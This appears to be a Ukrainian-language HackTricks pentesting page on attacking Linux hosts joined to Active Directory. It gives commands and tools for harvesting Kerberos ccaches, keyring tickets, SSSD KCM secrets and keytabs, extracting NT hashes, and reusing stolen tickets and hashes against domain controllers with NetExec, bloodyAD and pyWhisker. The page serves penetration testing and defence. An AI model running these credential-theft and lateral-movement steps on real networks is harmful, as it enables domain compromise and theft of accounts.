# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux-машина також може бути присутня в середовищі Active Directory.

Linux-машина всередині AD може **локально зберігати матеріали Kerberos**: користувацькі ccaches, машинні/сервісні keytabs і секрети, якими керує SSSD. Ці артефакти зазвичай можна повторно використовувати як будь-які інші облікові дані Kerberos. Щоб прочитати більшість із них, потрібно бути власником користувача, якому належить ticket, або **root** на машині.

## Перерахування

### Перерахування AD з Linux

Якщо ви маєте доступ до AD з Linux (або до bash у Windows), можна спробувати [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) для перерахування AD.

Також можна переглянути наведену нижче сторінку, щоб дізнатися про **інші способи перерахування AD з Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA — це open-source **альтернатива** Microsoft Windows **Active Directory**, призначена переважно для середовищ **Unix**. Вона поєднує повноцінний **LDAP-каталог** із MIT **Kerberos** Key Distribution Center для керування, подібного до Active Directory. Використовуючи Dogtag **Certificate System** для керування сертифікатами CA та RA, вона підтримує **багатофакторну** автентифікацію, зокрема за допомогою смарт-карт. SSSD інтегровано для процесів автентифікації Unix. Дізнайтеся більше про це на сторінці:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Артефакти хоста, приєднаного до домену

Перш ніж працювати з tickets, визначте, **як саме хост було приєднано до AD** і **де насправді зберігаються матеріали Kerberos**. На сучасних Linux-хостах цим зазвичай керує зв’язка `realmd` + `adcli` + `sssd`, а не просто плоскі файли в `/tmp`:
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
Це швидко показує, чи довіряє host AD, чи кешує SSSD identities або tickets, а також чи доступні для зловживання **machine/service keytabs** або **KCM secrets**.

## Робота з tickets

### Pass The Ticket

На цій сторінці ви знайдете різні місця, де можна **знайти kerberos tickets усередині linux host**; на наступній сторінці ви дізнаєтеся, як перетворити ці формати CCache на Kirbi (формат, потрібний для використання у Windows), а також як виконати PTT attack:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Якщо вас цікавлять **Linux-specific ticket harvesting workflows** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` тощо), перегляньте спеціальну сторінку:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Повторне використання CCACHE ticket із /tmp

Файли CCACHE — це бінарні формати для **зберігання Kerberos credentials**. `FILE:/tmp/krb5cc_%{uid}` досі часто використовується, але сучасні Linux deployments також використовують `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` або `KCM:%{uid}`. Перевірте змінну середовища **`KRB5CCNAME`** і налаштування `default_ccache_name`, перш ніж припускати, що tickets знаходяться в `/tmp`.<sup>[[1]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### Повторне використання CCACHE ticket із keyring

**Kerberos tickets, збережені в пам'яті процесу, можна витягнути**, особливо коли захист `ptrace` на машині вимкнено (`/proc/sys/kernel/yama/ptrace_scope`). Корисний інструмент для цього доступний за адресою [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey). Він спрощує extraction, виконуючи ін'єкцію в сесії та зберігаючи tickets у `/tmp`.

Для налаштування та використання цього інструмента виконуються наведені нижче кроки:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ця процедура спробує виконати ін'єкцію в різні сесії, вказуючи на успіх збереженням витягнутих квитків у `/tmp` за схемою іменування `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Повторне використання квитків CCACHE із SSSD KCM

SSSD підтримує копію бази даних за шляхом `/var/lib/sss/secrets/secrets.ldb`. Відповідний ключ зберігається як прихований файл за шляхом `/var/lib/sss/secrets/.secrets.mkey`. За замовчуванням ключ можна прочитати лише за наявності дозволів **root**.

Виклик **`SSSDKCMExtractor`** із параметрами --database і --key виконає аналіз бази даних і **розшифрує секрети**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Kerberos blob кешу облікових даних можна перетворити на придатний для використання файл Kerberos CCache**, який можна передати до Mimikatz/Rubeus.

### Швидкий тріаж keytab
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### Вилучення облікових записів із /etc/krb5.keytab

Ключі облікових записів служб, необхідні для роботи служб із привілеями **root**, безпечно зберігаються у файлах **`/etc/krb5.keytab`**. Ці ключі, подібні до паролів служб, потребують суворої конфіденційності.

Для перевірки вмісту файлу keytab можна використовувати **`klist`**. У Linux команда `klist -k -K -e` виводить principals, номери версій ключів, типи шифрування та необроблений матеріал ключів. Якщо тип ключа — **23 / RC4-HMAC**, значення ключа також є **NT hash** цього principal.
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
Для користувачів Linux **`KeyTabExtract`** надає функціональність для вилучення хешу RC4 HMAC, який можна використати для повторного використання NTLM hash. Зверніть увагу, що це працює лише тоді, коли keytab все ще містить матеріал **etype 23 / RC4-HMAC**. У середовищах, де використовується лише **AES**, ви можете не отримати придатний для повторного використання NT hash, але все одно можете безпосередньо автентифікуватися за допомогою keytab через Kerberos.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
У macOS **`bifrost`** використовується як інструмент для аналізу файлів keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Використовуючи отриману інформацію про облікові записи та хеші, можна встановлювати підключення до серверів за допомогою таких інструментів, як **`NetExec`**.
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache netexec smb <DC_FQDN> --use-kcache
```
### Повторне використання облікового запису комп'ютера з `/etc/krb5.keytab`

У системах, приєднаних через `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` зазвичай містить **обліковий запис комп'ютера** та один або кілька **principals хоста/служби**. Якщо у вас є **root**, не просто виводьте його вміст: скористайтеся одним із principals, перелічених за допомогою `klist -k`, щоб запросити TGT і працювати від імені самого Linux-хоста.
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
Це особливо корисно, коли сам **об'єкт computer** має делеговані права в AD або коли хосту дозволено отримувати інші секрети, як-от **gMSA**.

### Повторне використання викрадених матеріалів Kerberos за допомогою Linux-first AD tooling

Отримавши дійсний `ccache` або придатний keytab, ви можете працювати з AD **безпосередньо з Linux**, не перетворюючи все спочатку у формати Windows. Багато сучасних інструментів нативно підтримують `KRB5CCNAME` / автентифікацію Kerberos:
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
Це хороший міст між **Linux post-exploitation** і **AD object abuse**. Щодо самих шляхів зловживання на рівні об'єктів дивіться:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Артефакти Linux gMSA / Managed Service Account

Сучасні розгортання Linux можуть безпосередньо використовувати **Managed Service Accounts** з AD. На практиці це означає, що після компрометації Linux-сервера ви можете знайти не лише ключову таблицю хоста, але й **service-specific keytabs**, згенеровані з gMSA. Поширені місця для перевірки: `/etc/gmsad.conf`, файли конфігурації, специфічні для розгортання, а також додаткові файли `*.keytab` у `/etc`.<sup>[[2]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
Це надає вам повторно використовувану Kerberos-ідентичність для SPN, прив’язаних до цього gMSA, **не взаємодіючи з жодною кінцевою точкою Windows**. Щодо зловживання gMSA/dMSA **на стороні домену** після отримання вищих привілеїв в AD дивіться:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## Посилання

- [1] [Kerberos (II): Як атакувати Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Доступ до AD за допомогою керованого облікового запису служби – безпосередня інтеграція систем RHEL з Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)

{{#include ../../banners/hacktricks-training.md}}
